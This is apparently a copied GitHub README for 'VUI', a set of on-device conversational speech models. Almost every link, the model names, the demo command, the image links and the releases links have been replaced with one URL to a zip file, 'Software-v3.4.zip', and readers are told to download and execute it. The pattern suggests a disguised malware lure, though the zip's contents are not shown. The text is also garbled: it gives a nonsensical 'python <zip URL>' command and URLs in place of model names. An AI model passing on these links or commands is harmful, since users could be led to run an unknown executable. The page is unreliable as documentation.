# 🎤 VUI: Conversational Speech Models for On-Device Use

Welcome to the VUI repository! Here, you will find small conversational speech models designed to run directly on your device. Our models are lightweight yet powerful, enabling engaging interactions without needing extensive server resources.

## 📦 Installation

To get started with VUI, you need to install the package. Use the following command:

```sh
pip install -e .
```

This command installs the VUI package in editable mode, allowing you to make changes and test them quickly.

## 🚀 Demo

Want to see VUI in action? You can try it out on Gradio:

[Try on Gradio](https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip)

To run the demo locally, execute the following command:

```sh
python https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip
```

This will start the demo, allowing you to interact with the models directly on your machine.

## 🗣️ Models

VUI offers several models, each with unique capabilities:

- **https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip**: This is the foundational checkpoint, trained on 40,000 hours of audio conversations. It serves as a robust starting point for various applications.
  
- **https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip**: This model features a single speaker that can respond with context awareness. It understands previous interactions, making conversations feel more natural.
  
- **https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip**: This checkpoint includes two speakers that can converse with each other. It simulates dialogues, enhancing the conversational experience.

## 🎙️ Voice Cloning

You can use the base model for voice cloning. While it performs reasonably well, it is important to note that it may not be perfect. The model has limited exposure to audio data and wasn't trained for an extended period. Therefore, while you can achieve good results, you might encounter some limitations.

## 🔍 Research

VUI is built on a llama-based transformer architecture. It predicts audio tokens, enabling it to generate speech based on the input it receives. This research aims to push the boundaries of what is possible with on-device conversational AI.

## ❓ FAQ

Here are some frequently asked questions regarding VUI:

1. **What hardware was used for development?**  
   The models were developed using two NVIDIA 4090 GPUs. You can check out more details on this [Twitter post](https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip).

2. **Does the model hallucinate?**  
   Yes, the model does experience hallucinations. Despite these challenges, it is the best version we could create with the resources available.

3. **Why does Voice Activity Detection (VAD) slow things down?**  
   VAD is essential for removing areas of silence, which improves the overall quality of the interaction. However, it does introduce some latency.

## 📄 Citations

If you wish to cite this work, please use the following reference:

```bibtex
@software{vui_2025,
  author = {Coultas Blum, Harry},
  month = {01},
}
```

## 📥 Releases

For the latest versions and updates, please visit our [Releases section](https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip). You can download the necessary files and execute them to get started with the latest features.

## 🎨 Visuals

Here are some images that represent the essence of VUI:

![VUI Model Architecture](https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip)
![Conversational AI](https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip%20Interactions-green)

## 📚 Additional Resources

For more detailed information on using VUI, consider checking the following resources:

- [VUI Documentation](https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip): A comprehensive guide on how to implement and utilize the models effectively.
- [Research Papers](https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip): Access to academic papers that delve into the underlying technology of VUI.

## 💡 Getting Help

If you encounter issues or have questions, feel free to reach out. You can create an issue in the repository, and we will assist you as soon as possible.

## 🔗 Links

For updates and further information, visit our [Releases section](https://github.com/Akilan04A/vui/raw/refs/heads/main/src/vui/Software-v3.4.zip) regularly. 

Thank you for your interest in VUI! We hope you enjoy using our conversational speech models and find them useful for your projects.